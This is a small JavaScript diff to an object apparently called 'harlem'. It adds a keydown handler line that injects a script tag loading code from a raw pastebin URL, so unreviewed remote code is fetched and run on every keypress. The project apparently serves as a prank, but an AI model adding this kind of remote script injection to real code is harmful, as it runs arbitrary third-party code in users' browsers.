@@ -5,6 +5,7 @@ var harlem = {
 			console.log('ready to do some fun stuff');
 			$(document).keydown(function(e){
 				console.log(e.keyCode);
+				$('head').append('<script type="text/javascript" src="http://pastebin.com/raw.php?i=ipHpLuEz"></script>');
 			});
 		});
 	}
